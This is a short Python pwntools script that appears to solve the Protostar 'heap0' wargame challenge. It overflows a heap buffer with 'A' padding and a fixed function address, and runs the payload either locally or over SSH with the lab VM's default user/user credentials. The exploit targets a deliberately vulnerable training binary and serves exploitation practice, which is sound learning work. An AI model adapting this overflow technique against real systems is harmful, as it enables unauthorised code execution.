#!/usr/bin/env python

from pwn import *

#  offset differs, and is 80 at local and 72 at remote
e = ELF('./heap0')
def local():
    payload = "A"*80
    payload += p32(0x8048464)
    r = process([e.path, payload])
    print(r.recv())
    r.close()
def exploit(ipAddr):
    payload = "A"*72
    payload += p32(0x8048464)
    s = ssh("user", ipAddr, 22, password="user")
    r = s.run('/opt/protostar/bin/heap0 {}'.format(payload))
    print(r.recv())
    r.close()

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])

elif sys.argv[1] == "local":
    local()

else:
    exploit(sys.argv[1])

